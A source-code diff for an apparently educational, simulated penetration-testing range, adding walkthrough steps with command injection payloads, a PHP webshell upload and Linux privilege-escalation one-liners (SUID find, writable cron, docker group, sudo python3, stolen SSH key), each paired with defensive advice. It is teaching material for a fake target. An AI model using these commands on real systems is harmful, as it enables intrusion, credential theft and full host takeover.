+  curl -s "${H}/ping?host=127.0.0.1%3Bid"                       %3B is a semicolon: run id after the ping
+  curl -s "${H}/ping?host=127.0.0.1%3Bcat%20/var/www/config.php" read the config with the same primitive
+  curl -s "${H}/ping?host=127.0.0.1%7Cid"                       a pipe works too, when ; is filtered
+  curl -s "${H}/ping?host=127.0.0.1%3Bwhoami%3Bhostname"        two commands, one request
+PYTHON (the same injection, from the sandbox)
+  python3 -c "import requests; r = await requests.get('/ping?host=127.0.0.1%3Bid'); print(r.text[-120:])"
+WHAT TO LOOK FOR
+  · the normal ping transcript followed by uid=33(www-data) gid=33(www-data) — command execution as the web user.
+  · the config file with $DB_PASS, the deploy key and the admin hash.
+  · the response time barely changes: this range answers instantly, a real ping would take seconds.
+IF IT DOESN'T WORK
+  · Encode the separator: ; is %3B, | is %7C, space is %20, & is %26. Quote the whole URL in the shell.
+  · The output is empty: try 127.0.0.1;id without the space, or use $(id) if the field allows it.
+  · Still nothing: the endpoint may pass an argument list rather than a shell string. Note the defence and move on.
+TEACHES   OS command injection, and the difference between a shell string and an argument list.
+DEFEND    Never call a shell from an application: pass an argument array (execFile/spawn with shell:false), validate
+          the host with a real parser, and run the service in a container that holds nothing it does not need.
+${state('cmdi')}`);
 
     add('upload', 'Unrestricted upload: turn a file into code', `GOAL      Get a file of your own onto the server, in a place it will run.
 WHY       The endpoint checks that the name ends in .php and stores it under the webroot. A file the server executes,
-          in a directory it serves, is a webshell: a page whose parameters are commands.
-DO        Upload it.
-TYPE      curl -X POST "${H}/upload?file=shell.php"
-EXPECT    201 Created with {"stored":"/uploads/shell.php"} — a file you control, where the web server will run it.
-TEACHES   Unrestricted file upload to remote code execution, the shortest path from a web page to a shell. Note what
-          the check got wrong: it validated the *name*, not the content, and it stored the file where execution is
-          possible.
-FIX       Validate type by content (magic bytes), rename and store uploads outside the webroot, serve them through a
-          handler that sets Content-Disposition, and disable execution in the uploads directory.`);
+          in a directory it serves, is a webshell: a page whose parameters are commands. This is the shortest path
+          from a web page to a shell, and the reason upload directories are treated as hostile ground.
+${where}
+COMMANDS TO TRY
+  curl -X POST "${H}/upload?file=shell.php"
+     create the webshell entry this range stores (it has no multipart parser, so -F would send nothing)
+  curl -s "${H}/uploads/shell.php?cmd=id"
+     call the webshell with a command, once it exists
+  curl -s "${H}/uploads/shell.php?cmd=cat%20/var/www/config.php"
+     the same page, reading the config
+  python3 -c "import requests; r = await requests.post('/upload?file=shell.php'); print(r.status_code, r.text)"
+     the upload from Python: the same 201 and the same /uploads/shell.php
+  shell
+     the range's own webshell, which is easier to explore than one command per URL
+WHAT TO LOOK FOR
+  · 201 Created with {"stored":"/uploads/shell.php"} — a file you control, where the web server will run it.
+  · the uploads listing now contains shell.php (ls /var/www/uploads in the box, or curl /uploads).
+  · the page executing the cmd parameter without sanitising it.
+IF IT DOESN'T WORK
+  · -F was used: this server has no multipart parser, so use the ?file= form above; it is the one it accepts.
+  · 403: uploads may require the staff session first; finish login, then retry with -b.
+  · 404 on the uploaded file: the stored path is in the JSON response — use exactly that path.
+TEACHES   Unrestricted file upload to remote code execution. Note what the check got wrong: it validated the *name*,
+          not the content, and it stored the file where execution is possible.
+DEFEND    Validate type by content (magic bytes), rename and store uploads outside the webroot, serve them through a
+          handler that sets Content-Disposition, and disable execution in the uploads directory.
+${state('upload')}`);
 
     add('shell', 'The foothold: a session on the box as www-data', `GOAL      Use the webshell to look around the host the way an attacker would — and the way a defender must imagine.
-WHY       The webshell is code execution as the web user. From here, configuration, history and secrets are readable,
-          and this is where a real engagement spends most of its hours.
-DO        Open the shell and look at who you are, what is on the disk, and what the app left lying around.
-TYPE      shell
-TYPE      id
-TYPE      ls /
-TYPE      cat /flag
-TYPE      cat /var/www/config.php
-TYPE      cat /home/maint/.bash_history
-EXPECT    uid=33(www-data); a / holding var, etc, home, root and a flag; a www_ flag (a placeholder for whatever the
-          business actually cares about); database credentials and an API key; and a history file naming the commands
-          the box's admin ran — including the privesc you are about to use.
+WHY       The webshell is code execution as the web user. From here configuration, history and secrets are readable,
+          and this is where a real engagement spends most of its hours. The point is not to run one clever command:
+          it is to build a picture of the host that the report can describe.
+${where}
+COMMANDS TO TRY
+  shell                                  drop into the box (prompt becomes www-data@…)
+  id                                     who you are, and which groups you have
+  ls -la /                               the root of the filesystem, including the flag file
+  cat /flag                              the web-user flag: ${String(flagRoot).replace('root_', 'www_')}
+  cat /var/www/config.php                database password, deploy key, admin hash
+  cat /home/maint/.bash_history          the admin's own commands — the privesc clue
+  sudo -l                                what this account may run as root (read the output closely)
+  find / -perm -4000 2>/dev/null         SUID binaries: the second privesc clue
+  crontab -l                             scheduled jobs: the third clue
+  id ; groups                            groups again, after you have read the clues
+  ps aux ; ss -tulpn                     what is running and what is listening
+  exit                                   leave the box, back to kali@pentest
+WHAT TO LOOK FOR
+  · uid=33(www-data) gid=33(www-data) groups=33(www-data)${i.privesc === 'docker-group' ? ',999(docker)' : ''}
+  · / holding var, etc, home, root, tmp and flag.
+  · a www_ flag (a placeholder for whatever the business actually cares about) — submit it with solve <flag>.
+  · database credentials, an API key, and a history file naming the commands the box's admin ran.
+  · the privesc clue for THIS target: ${priv.tell}
+IF IT DOESN'T WORK
+  · "shell: command not found": you are already inside a remote session — type exit once, then shell.
+  · cat /root/flag.txt is permission denied: that is correct until root. The www_ flag at /flag is the one this step owns.
+  · The shell prompt does not change: the range is still in local mode; run shell and check the prompt line.
 TEACHES   A foothold, and why the valuable data on a server is configuration and habit, not the trophy file.
-FIX       Give the service account the least privilege it needs, keep secrets out of the webroot, disable shell history
-          for service users, and alert on uploads that are immediately followed by command execution.`);
+DEFEND    Give the service account the least privilege it needs, keep secrets out of the webroot, disable shell history
+          for service users, and alert on uploads that are immediately followed by command execution.
+${state('shell')}`);
+
+    /* the privesc block is the one part that differs per target: print the commands this exact box accepts */
+    const rootPlan = (() => {
+      switch (i.privesc) {
+        case 'suid-find': return {
+          tell: 'sudo -l shows (root) NOPASSWD: /usr/bin/apt-get, and apt-get runs maintainer scripts as root. A SUID\n          binary (/opt/backup-tool) is the second route: either one is enough.',
+          enum: '  sudo -l                                   apt-get is allowed without a password\n  find / -perm -4000 2>/dev/null            /opt/backup-tool stands out from passwd, sudo and find\n  ls -l /opt/backup-tool                    the SUID bit, owned by root',
+          run: '  sudo apt-get update                       the NOPASSWD package manager runs its scripts as root\n  find / -perm -4000 -exec /bin/sh -p \\;    the SUID route: a root shell from the odd binary',
+          flag: '  cat /root/flag.txt'
+        };
+        case 'writable-cron': return {
+          tell: 'crontab -l shows /opt/backup.sh run by root every minute — and the file is world-writable.',
+          enum: '  crontab -l                                the minute-by-minute job\n  ls -l /opt/backup.sh                      world-writable, owned by root\n  cat /opt/backup.sh                        what root will execute',
+          run: '  echo "chmod +s /bin/bash" > /opt/backup.sh     plant your line in root\'s script\n  wait                                           let the next minute arrive\n  ls -l /bin/bash                                the SUID bit appears\n  /bin/bash -p                                   a root shell',
+          flag: '  cat /root/flag.txt'
+        };
+        case 'docker-group': return {
+          tell: 'id shows the account is in the docker group, and docker group membership is host root by design.',
+          enum: '  id                                        look for 999(docker)\n  groups                                    docker beside www-data\n  docker ps                                 the engine answers without sudo',
+          run: '  docker run -v /:/mnt alpine chroot /mnt /bin/sh    mount the host and become its root\n  whoami                                           inside the container: root',
+          flag: '  cat /root/flag.txt'
+        };
+        case 'ssh-key': return {
+          tell: 'the maint user left a private SSH key in /home/maint/.ssh/id_rsa, and root accepts it.',
+          enum: '  ls -la /home/maint/.ssh                   the key is readable\n  cat /home/maint/.ssh/id_rsa               copy it into a file you control',
+          run: '  cat /home/maint/.ssh/id_rsa > /tmp/maint.key\n  chmod 600 /tmp/maint.key\n  ssh -i /tmp/maint.key root@localhost       the key is root\'s, so the login is root\'s',
+          flag: '  cat /root/flag.txt'
+        };
+        default: return {
+          tell: 'sudo -l shows (ALL) NOPASSWD: /usr/bin/python3 — a whole interpreter, for anyone, without a password.',
+          enum: '  sudo -l                                   the NOPASSWD line is the finding\n  id                                        you are www-data, not root (yet)',
+          run: '  sudo /usr/bin/python3 -c "import os; os.setuid(0); os.system(\'/bin/sh\')"\n     the interpreter runs as root and hands you a shell',
+          flag: '  cat /root/flag.txt'
+        };
+      }
+    })();
 
     add('', 'Privilege escalation: find what the admin did for convenience', `GOAL      Find the misconfiguration that turns www-data into root.
 WHY       In ranges and in real life, root is rarely "exploited": it is granted by something someone set up to make
           their day easier. You are looking for what your account may run, what runs as root and is writable, and
-          which groups you are in. Method first, exploit second.
-DO        Enumerate all four of those things, in that order.
-TYPE      sudo -l
-TYPE      find / -perm -4000 2>/dev/null
-TYPE      crontab -l
-TYPE      id ; groups
-EXPECT    one of these, and this target gives you: ${priv.tell}
+          which groups you are in. Method first, exploit second. Every one of those checks is cheap; guessing is not.
+${where}
+COMMANDS TO TRY (run these inside the shell, after the shell step)
+${rootPlan.enum}
+  cat /home/maint/.bash_history             the admin's habits, if you have not read them yet
+  linpeas.sh                                a summary of all of the above, in one invented report
+WHAT TO LOOK FOR
+  · ${rootPlan.tell}
+  · a group you should not be in, a NOPASSWD entry for a program that can run commands, a SUID binary that is not a
+    standard system tool, or a root-owned script you can write to.
+  · exactly one of these will be the live path on this floor; the others are the decoys a real host also has.
+IF IT DOESN'T WORK
+  · You are in kali@pentest, not on the box: type shell first, then id.
+  · sudo -l asks for a password: you are not the web user; check whoami and re-enter the shell.
+  · Nothing looks writable: look again at the output of find / -writable and at crontab -l as a pair.
 TEACHES   Enumeration beats exploitation: almost all privilege escalation is a permissions bug. Read output carefully —
           NOPASSWD, the SUID bit, a world-writable script that root runs, or a group you should not be in.
-FIX       No NOPASSWD for interpreters or package managers, no world-writable files executed by root, no docker group
-          for web users, and review sudoers and cron as security code with an owner and a test.`);
+DEFEND    No NOPASSWD for interpreters or package managers, no world-writable files executed by root, no docker group
+          for web users, and review sudoers and cron as security code with an owner and a test.
+${state('')}`);
 
     add('root', 'Root: the end of the chain, and the place to stop', `GOAL      Take root, prove it with one command, and stop touching the box.
 WHY       The chain is the lesson, not the trophy. In a real engagement you take root, capture the smallest piece of
-          evidence that proves it, and write it up — you do not keep exploring a client's host.
-DO        Use the misconfiguration you found on the previous step.
-TYPE      ${priv.run}
-EXPECT    uid=0(root) gid=0(root) groups=0(root) — and the range ticking its last objective.
-TEACHES   Impact: the same upload bug plus one convenience setting is total control of the host. This is the line
-          that turns a finding into an incident.
-FIX       Everything from the previous step, plus: remove the convenience setting today, alert on privilege changes,
-          and rotate every secret the box ever held.`);
+          evidence that proves it, and write it up — you do not keep exploring a client's host. The proof is a single
+          command whose output could only come from root.
+${where}
+COMMANDS TO TRY (inside the shell)
+${rootPlan.run}
+${rootPlan.flag}                                  the root-only flag for this floor
+  id                                                uid=0(root) gid=0(root) groups=0(root) — the proof
+WHAT TO LOOK FOR
+  · uid=0(root) gid=0(root) groups=0(root)      — root, from the exact path you found in the previous step.
+  · ${flagRoot}                                  — the root flag. Submit it: solve ${flagRoot}
+  · the range's last objective ticks. That tick is the only "done" that counts.
+IF IT DOESN'T WORK
+  · Permission denied after sudo: the binary is not the NOPASSWD one; copy the command from sudo -l exactly.
+  · The cron route needs a minute: run wait (or sleep 60) after writing the file, then check ls -l /bin/bash.
+  · The docker route says permission denied: you are not on the box; type shell first, then id | grep docker.
+  · ssh asks for a password: use -i with the key file you saved, and chmod 600 it first.
+TEACHES   Impact: the same upload bug plus one convenience setting is total control of the host. This is the line that
+          turns a finding into an incident.
+DEFEND    Everything from the previous step, plus: remove the convenience setting today, alert on privilege changes,
+          and rotate every secret the box ever held.
+${state('root')}`);
+
+    add('', 'Optional findings: the exploits that are not on the objective list', `GOAL      Collect the extra findings a thorough tester would also report, without needing them to finish the floor.
+WHY       A range holds you to a fixed list so it can score you. A real site has more: objects you can read by number,
+          an API with no authentication, a git directory, a reflected parameter, a stored comment. Looking for them is
+          the difference between completing the exercise and doing the job.
+${where}
+COMMANDS TO TRY
+  curl -s "${H}/profile?id=1"                     IDOR: read the admin record by changing the number
+  curl -s "${H}/profile?id=2"                     the same route, another user: compare the two answers
+  curl -s "${H}/api/users"                        an API that answers without a session, when the site has one${sec.openUsersApi ? ' (this one does)' : ''}
+  curl -s "${H}/api/orders/1"                     an object reference with no ownership check${sec.openIdor ? ' (this one does)' : ''}
+  curl -s "${H}/api/search?q=%27"                 a search API that leaks a SQL error${sec.sqliSearch ? ' (this one does)' : ''}
+  curl -s "${H}/.git/config"                      an exposed git directory; look for a deploy URL and token${i.depth > 4 ? ' (this floor exposes one)' : ' (deeper floors expose one)'}
+  curl -s "${H}/guestbook"                        stored comments: try posting a <script> in a browser tab
+  nikto -h ${H}                                   reread its list and pick one finding to verify by hand
+WHAT TO LOOK FOR
+  · JSON for admin (id 1) and guest (id 2): names, emails, roles and API keys, with no session at all.
+  · /api/users returning an array instead of 401; /api/orders/1 returning another user's order.
+  · .git/config with a remote URL containing deploy:<token>@ — a credential in a static file.
+  · a comment that runs script in the guestbook page when a browser renders it.
+IF IT DOESN'T WORK
+  · 401/403: the finding is the missing authorisation, but this site may require a session first. Retry with -b.
+  · 404: the feature is not on this floor. Deeper floors add it; do not invent evidence.
+  · Each finding is optional. Note it with  note <text>  and include it in report, but do not trade the core chain for it.
+TEACHES   Breadth after depth: once the chain is done, sweep the surface. A report with six small findings and one
+          critical chain is worth more than a trophy with no context.
+DEFEND    Authorise every object, authenticate every API, keep .git out of the webroot, encode output, and test the
+          boring routes as carefully as the login.
+${state('')}`);
 
     add('', 'The report: turn the chain into something that gets fixed', `GOAL      Write up the engagement so a client can act on it.
 WHY       Findings without evidence are opinions, and findings without fixes are homework. The report is the actual
-          deliverable; the shell was only how you collected evidence.
-DO        Collect what you took, note what you did, and look at what the range says you finished.
-TYPE      loot
-TYPE      note login bypass via SQL injection in /login (u parameter)
-TYPE      report
-TYPE      status
-EXPECT    every secret you lifted, listed; your note kept with the engagement; every objective ticked.
-TEACHES   Reporting: one entry per finding with title, severity, affected host, evidence (the request and the
-          response), impact in business words, the fix, and how the fix will be retested. Then the retest.
-FIX       For each finding above, name the fix, the owner and the test that proves it is closed. Two findings here are
-          usually critical on their own: the SQL injection and the upload that executes.
-DONE      When the range shows every objective ticked: type next to take the next floor (fresh secrets, one more
-          technique), or guide next to finish this ladder, or guide off to leave the walkthrough.`);
-
+          deliverable; the shell was only how you collected evidence. A good entry has the request, the response, the
+          impact in business words, the fix, and the test that proves the fix closed it.
+${where}
+COMMANDS TO TRY
+  loot                                   every secret you lifted, with the values
+  note login bypass in ${loginPath}, staff page ${ADMIN} leaks the deploy secret
+  note upload at /upload stores a PHP webshell under /uploads
+  note root via ${i.privesc}; ${flagRoot} captured
+  report                                 one entry per objective: severity, evidence and fix
+  status                                 every objective, ticked or not
+  solve ${flagWeb}                        bank the web flag
+  solve ${flagRoot}                       bank the root flag
+WHAT TO LOOK FOR
+  · every secret you took, listed with its value; your notes kept with the engagement.
+  · report: an entry for each finding, with severity, the request/response evidence, and the fix.
+  · status: every objective [x]. If one is still [ ], the range is telling you the chain is not finished.
+IF IT DOESN'T WORK
+  · A note with spaces needs no quotes; a note with a newline stops at the first line.
+  · report is empty: objectives are what populate it; finish the chain first.
+  · next refuses: status names the remaining objective. hint gives its exact command.
+TEACHES   Reporting: one entry per finding with title, severity, affected host, evidence, impact, fix and retest. Then
+          the retest.
+DEFEND    For each finding above, name the fix, the owner and the test that proves it is closed. Two findings here are
+          usually critical on their own: the SQL injection (or leaked credential) and the upload that executes.
+DONE      When status shows every objective ticked: type next to take the next floor (fresh secrets, one more
+          technique), or guide list to see where you are, or guide off to leave the walkthrough.
+${state('')}`);
     return steps;
   }
 
@@ -1632,6 +1929,8 @@ DONE      When the range shows every objective ticked: type next to take the nex
     '  guide next       move on — only once the range has ticked the current step',
     '  guide 6          jump to step 6 (you can always come back)',
     '  guide intro      these rules again   ·   guide off turns it off',
+    '  langs            what this shell can really run (python3, node, sqlite3, Scheme, Prolog, Forth, BASIC …)',
+    '                   and it works while the range is open: python3 -c "print(2**10)"',
     '',
     'HOW YOU KNOW YOU DID IT',
     'The range keeps score: each objective it ticks (recon, login, upload, root …) is a real check of the state it',
@@ -2952,12 +3251,70 @@ DONE      When the range shows every objective ticked: type next to take the nex
     };
   }
 
+  /* the room's own tree, in the shape the Python and file runners read */
+  function langContext() {
+    let ctx = { shell: 'bash', tree: {}, cwd: [], home: ['home', 'moundshroud'] };
+    try {
+      if (room && room.snapshot) {
+        const snap = room.snapshot();
+        const cwd = Array.isArray(snap.cwd) ? snap.cwd.slice() : String(snap.cwd || '').split('/').filter(Boolean);
+        ctx = { shell: 'bash', tree: snap.tree || {}, cwd, home: ['home', shellIdentity()] };
+      }
+    } catch (e) { }
+    /* `python3 x.py > out.txt` writes into this shell's own tree, and `node a.js && echo ok` hands the shell half back */
+    ctx.write = (path, text, append) => writeShellFile(path, text, append);
+    ctx.shellRun = line => {
+      try { return room ? String(room.run(line) || '') : ''; } catch (e) { return 'bash: ' + String(e && e.message || e); }
+    };
+    /* after a shell half of a && chain ran, the language half must see the files it just wrote */
+    ctx.refresh = () => {
+      try {
+        const snap = room && room.snapshot ? room.snapshot() : null;
+        if (!snap) return;
+        ctx.tree = snap.tree || {};
+        ctx.cwd = Array.isArray(snap.cwd) ? snap.cwd.slice() : String(snap.cwd || '').split('/').filter(Boolean);
+      } catch (e) { }
+    };
+    /* A breach range is a simulated target: `import requests` in Python reaches the same fake server curl does,
+       and ticks the same objectives. With no range open there is no host to answer, so Python stays sealed. */
+    if (breach && typeof breach.http === 'function') {
+      ctx.host = typeof breach.host === 'function' ? breach.host() : '';
+      ctx.hostCall = (fn, args) => {
+        if (String(fn) === 'host') return String(ctx.host || '');
+        if (String(fn) !== 'http') throw new Error('unknown request: ' + fn);
+        let req = {};
+        try { req = JSON.parse(String(args || '{}')); } catch (e) { throw new Error('bad request from python'); }
+        const r = breach.http(req.method || 'GET', req.url || '', { headers: req.headers || {}, body: req.body == null ? '' : req.body });
+        return JSON.stringify(r);
+      };
+    }
+    return ctx;
+  }
+
   async function exec(raw) {
     if (busy) return;
     const line = String(raw == null ? '' : raw);
     typed(promptText() + line);
     paint();
-    if (!line.trim()) return;
+    /* an open Python REPL owns the line until exit()/quit(): a blank line ends an indented block, and `clear` is
+       Python's business there, not the screen's */
+    if (!line.trim() && !repl) return;
+    if (repl) {
+      hist.push(line); hi = hist.length;
+      busy = true;
+      let out = '';
+      try {
+        const r = await repl.push(line);
+        if (r && r.exit) { out = r.text || ''; repl = null; }
+        else { out = (r && r.text) || ''; repl.prompt = r && r.cont ? '... ' : '>>> '; }
+      } catch (e) {
+        out = (repl.kind || 'python') + ': ' + String(e && e.message || e);
+      } finally { busy = false; }
+      if (out) say(String(out).replace(/\n$/, ''));
+      paint();
+      if (promptEl) promptEl.textContent = promptText();
+      return out;
+    }
     if (line.trim() === 'clear') { resetScreen(); return; }
     /* `pentest` switches between the Pentest user and moundshroud@moundshroud. It only exists inside the Cyber VM:
        with the VM off there is no kali@pentest to become, and the shell stays moundshroud@moundshroud. */
@@ -3020,6 +3377,48 @@ DONE      When the range shows every objective ticked: type next to take the nex
       paint();
       if (promptEl) promptEl.textContent = promptText();
       return text;
+    }
+    /* ---- real languages: python3, pip, node, sqlite3 and the built-in interpreters ------------------------- */
+    /* The sandboxes are real interpreters, so they need a line to finish: the shell waits here and prints the
+       program's output. The range's own webshell (a fake Linux box) is exempt — there, python3 belongs to the box. */
+    if (!(mcode && mcode.open && mcode.open()) && typeof window.ShellLangs !== 'undefined') {
+      const word = (line.trim().split(/\s+/)[0] || '').toLowerCase();
+      /* `python3 … | grep x` and `echo … && python3 x.py` are still language lines: the runner handles the pipe,
+         the redirect and the && chain itself, so the shell never swallows half a line */
+      const heads = line.trim().split(/&&/).map(part => (part.trim().split(/\s+/)[0] || '').toLowerCase()).filter(Boolean);
+      const LANG_WORD = /^(?:langs|languages|python3?|py|pip3?|node|nodejs|js|sqlite3|sqlite|scheme|scm|prolog|forth|basic|bf|brainfuck|ook|run|gcc|cc|g\+\+|rustc|javac|java|ruby|perl|php|lua|go|dotnet|tsc)$/;
+      const SCRIPT = /^(?:\.{0,2}\/)?[^\s/]+\.(?:py|pyw|js|mjs|cjs|sql|scm|pro|forth|f|bas|bf|ook)$/i;
+      const looksLikeLang = heads.some(h => LANG_WORD.test(h) || SCRIPT.test(h));
+      const remoteBox = !!(breach && breach.snapshot && breach.snapshot().remote);
+      if (looksLikeLang && !remoteBox) {
+        const barePy = /^(?:python3?|py)$/i.test(line.trim());
+        hist.push(line); hi = hist.length;
+        busy = true;
+        try {
+          if (barePy && window.ShellLangs.startPython) {
+            const s = window.ShellLangs.startPython(langContext());
+            if (s) {
+              repl = s;
+              say(s.banner);
+              return s.banner;
+            }
+          }
+          const res = await window.ShellLangs.execute(line, langContext());
+          if (res) {
+            const out = String(res.text == null ? '' : res.text).replace(/\n$/, '');
+            if (out) say(out);
+            return out;
+          }
+        } catch (e) {
+          const out = word + ': ' + String(e && e.message || e);
+          say(out);
+          return out;
+        } finally {
+          busy = false;
+          paint();
+          if (promptEl) promptEl.textContent = promptText();
+        }
+      }
     }
     if (pcSession) {
       hist.push(line); hi = hist.length;
@@ -3277,6 +3676,7 @@ DONE      When the range shows every objective ticked: type next to take the nex
      the app files are read again. With the Cyber VM running the fresh shell signs in as kali@pentest. */
   function resetSession() {
     breach = null; breachItem = null; pcSession = null; pcAuth = null;
+    syncTargetHelp();
     walk = { on: false, step: 0 };
     staged.clear(); hist = []; hi = 0;
     /* this is the only thing besides `pentest` that signs the shell in as kali@pentest: a restart with the VM running */
@@ -3288,6 +3688,15 @@ DONE      When the range shows every objective ticked: type next to take the nex
     resetSession();
     close();
     open();
+  }
+
+  /* Target help is offered only during an engagement. The toolbar button and the help window's own page both ask this
+     one question, so they can never disagree about whether there is a target to explain. */
+  function syncTargetHelp() {
+    const button = wrap && wrap.querySelector ? wrap.querySelector('#aeshelltargethelp') : null;
+    if (!button) return;
+    button.hidden = !breach;
+    button.style.display = breach ? '' : 'none';
   }
 
   function close() {
@@ -3304,7 +3713,7 @@ DONE      When the range shows every objective ticked: type next to take the nex
        A screen that is only the starting text (just cleared, or nothing typed yet) is not kept — it is made afresh. */
     savedLines = screenCleared || !lines.length ? null : lines.slice(-MAX_SCROLLBACK);
     screenCleared = false;
-    wrap.remove(); wrap = panel = out = inp = promptEl = null; room = null; lines = []; busy = false; maxed = false; minimized = false; staged.clear();
+    wrap.remove(); wrap = panel = out = inp = promptEl = null; room = null; repl = null; lines = []; busy = false; maxed = false; minimized = false; staged.clear();
     document.removeEventListener('keydown', onDocKey, true);
     document.removeEventListener('focus', syncFromDisk);
     window.removeEventListener('resize', clampGeometry);
@@ -4314,6 +4723,396 @@ DONE      When the range shows every objective ticked: type next to take the nex
     if (!shellKey || shellKey === 'moundshell') { buildManualRoom(); return manualShell(); }
     return shells.find(shell => shell.id === shellKey) || manualShell();
   }
+  /* ---- target help: the commands that work on the engagement in front of you ------------------------------------ */
+  /* A page about this target, not a walkthrough of it. It names the host, the floor and the session the shell is in,
+     and explains every command the range answers to there — what each one does to this target, why an engagement uses
+     it, and the switches this floor really implements. It never prints the path, credentials, payloads or flags: the
+     shell's own `hint` and `guide` are the deliberate answers, and they stay in the shell where the learner asks for
+     them. Sections are <details> so each one folds away instead of pushing the others off the page. */
+  function targetGuidePage() {
+    if (!breach) return null;
+    let s = {};
+    try { s = breach.snapshot ? (breach.snapshot() || {}) : {}; } catch (e) { s = {}; }
+    const host = s.host || (breachItem && breachItem.host) || 'the target';
+    const ip = s.ip || '';
+    const brand = s.brand || (breachItem && breachItem.title) || host;
+    const floor = Number(s.depth) || 1;
+    const objectives = Array.isArray(s.objectives) ? s.objectives : [];
+    const done = objectives.filter(o => o && o.done).length;
+    const total = objectives.length;
+    const session = s.rooted ? 'a root shell on the box' : s.remote ? 'a shell on the box as the web account' : 'the web app';
+
+    const p = text => '<p>' + text + '</p>';
+    const ul = items => '<ul style="margin:6px 0 10px 20px">' + items.map(item => '<li>' + item + '</li>').join('') + '</ul>';
+    /* What to look for, per command, read from this engagement: the floor, the open objective, the session you are
+       typing at and the target's own security profile decide which clue matters. Every entry is evidence to collect,
+       never a value to copy — the exact answer stays behind hint and guide. */
+    const prof = (s && s.sec) || {};
+    const ids = new Set(objectives.map(o => o && o.id).filter(Boolean));
+    const has = id => ids.has(id);
+    const openObjective = objectives.find(o => o && !o.done) || {};
+    const shellOpen = !!s.remote, isRoot = !!s.rooted;
+    const leaks = Array.isArray(prof.leaks) ? prof.leaks : [];
+    const DEFAULT_LOOK = 'A result that differs from what the target does for a request that should have succeeded — and any line you could quote as evidence in the report.';
+    const LOOK = {
+      help: 'The one output worth skimming before you type anything: it lists what this floor can answer.',
+      status: 'The first objective without a tick. That is the one hint speaks about, and the one whose evidence you should be collecting.',
+      targets: 'A host that is not the web app but still answers something: the gateway and the file server are in scope too.',
+      libraries: 'A title that matches the page this engagement was started from; another library has different secrets.',
+      target: 'Fresh secrets after a switch: every value in loot from the old target is now invalid.',
+      map: 'Which surface your floor says it has. A technique the ladder places on a deeper floor will not answer yet.',
+      depth: 'The floor number and objective count. If an expected command does nothing, the floor may not add that surface.',
+      hint: 'One exact command. Use it to confirm a theory, then read why it works instead of memorising the line.',
+      loot: 'A secret or file you have not turned into access yet — and the evidence lines the report will quote.',
+      note: 'Nothing in the output; the value is that the note survives reset-target, so it is your memory.',
+      report: 'A finding with no quoted evidence, or a fix that does not match the flaw. Those are what a reviewer catches.',
+      exploit: 'The whole chain. Treat it as an answer key: run it once, then rebuild the reasoning from the tables above.',
+      next: 'Every objective ticked. If it refuses, status shows what is still open.',
+      'reset-target': 'New hostnames and secrets on the same lesson; downloaded files no longer match the target.',
+      'reset-campaign': 'Floor 1 objectives again — the tutorial chain, not the deeper surfaces.',
+      clear: 'Nothing about the engagement changes; this is a screen command.',
+      breach: 'You are already inside; the way out is exit or breach end.',
+      nmap: 'An open port whose banner does not match the stack the web app claims, a port the default scan omitted, or a service on a host that is not the web app. Record the exact version: later steps must agree with it.',
+      whatweb: 'Server and language versions, a session cookie without HttpOnly, a title that does not match the page, or a header naming the framework. The stack decides which family of flaw is worth testing.',
+      nikto: 'A path or header finding you can confirm by hand, a robots.txt line naming a route the page never links, or a missing security header. The 403 and 302 lines are more interesting than the 200s.',
+      gobuster: 'One route behaving differently from the rest: 403 (exists, refused), 302 (redirects to a sign-in), or a body size that stands out. A route named in robots.txt is the same clue written down.',
+      ffuf: 'One route behaving differently from the rest: 403 (exists, refused), 302 (redirects to a sign-in), or a body size that stands out. A route named in robots.txt is the same clue written down.',
+      dirb: 'One route behaving differently from the rest: 403 (exists, refused), 302 (redirects to a sign-in), or a body size that stands out. A route named in robots.txt is the same clue written down.',
+      dirbuster: 'One route behaving differently from the rest: 403 (exists, refused), 302 (redirects to a sign-in), or a body size that stands out. A route named in robots.txt is the same clue written down.',
+      dig: 'Only names in the range resolve, so NXDOMAIN is itself the answer. A name resolving to a host that targets does not list is the interesting case.',
+      host: 'Only names in the range resolve, so “not found” is itself the answer. A name resolving to a host that targets does not list is the interesting case.',
+      nslookup: 'Only names in the range resolve, so NXDOMAIN is itself the answer. A name resolving to a host that targets does not list is the interesting case.',
+      whois: 'The range domain’s own record confirms which name is in scope; anything else answering is out of scope by design.',
+      searchsploit: 'A product and version that exactly matches a banner you saw — not a similar product. Prerequisites matter more than the title.',
+      msfconsole: 'Module names that describe the flaw family you already found; the range refuses to hide the chain behind a module.',
+      ms: 'Module names that describe the flaw family you already found; the range refuses to hide the chain behind a module.',
+      hydra: 'A message about no wordlist or no rate limit. On a real engagement a lockout message means stop, not retry harder.',
+      medusa: 'A message about no wordlist or no rate limit. On a real engagement a lockout message means stop, not retry harder.',
+      patator: 'A message about no wordlist or no rate limit. On a real engagement a lockout message means stop, not retry harder.',
+      curl: () => 'Status, headers and body changing with the method, a parameter, a cookie or a header — and the same request answering differently once a session is carried. Compare two requests; one 200 proves little.' +
+        (prof.sqliLogin === false ? ' This target’s sign-in is parameterised, so a quote in a parameter changing nothing is the expected result here — look for the readable configuration file the scan names instead.' : ''),
+      wget: 'A saved byte count that matches the body, or a 4xx that saved nothing. The transcript names the resolving address, which confirms the host in scope.',
+      unzip: 'Entries that should never be web-served: environment or config files, deploy notes, database dumps, keys. The file list is a finding before the contents are.',
+      strings: 'A key, token, password or hostname inside a file that is not meant to be text. Note the exact string and the file it came from.',
+      base64: 'A decoded value that has structure — JSON, key=value, a token — rather than the fact that decoding succeeded. If it still looks random, it is compressed or encrypted.',
+      xxd: 'A file header that says what the file really is (PK for a zip, %PDF), whatever its name claims.',
+      jq: 'A field the page did not show you: role, id, token, internal host. The JSON is evidence of what the API treats as private.',
+      john: 'A recovered password only when the hash is the one this floor planted; any other hash is a wordlist miss. Note the algorithm and why it was fast to attack.',
+      hashcat: 'The same recovery with a mode number. If the mode does not match the hash length, the tool is answering the wrong question.',
+      jwt: 'A payload whose role or subject is not the account you signed in as, and a header naming the algorithm. The signature still has to validate against the server’s key.',
+      id: 'A group that maps to root on this box (a container runtime, an admin group, a log reader) — and a user that matches the shell you think you are in.',
+      whoami: 'A user that matches the shell you think you are in. A surprise here means a different session than the one you opened.',
+      groups: 'A group that maps to root by design. Membership is the finding; the exploit has to use what that group actually permits.',
+      hostname: 'A machine name that agrees with the banner the scan showed. Disagreement means you are on a different host than you think.',
+      uname: 'A kernel or distribution string you can compare with the package and service versions seen from outside.',
+      pwd: 'A directory inside the web root, or one your account can write, when you expected to be somewhere else.',
+      cd: 'A directory that is readable when it should not be: home directories, /opt, /tmp and the web root are the usual ones.',
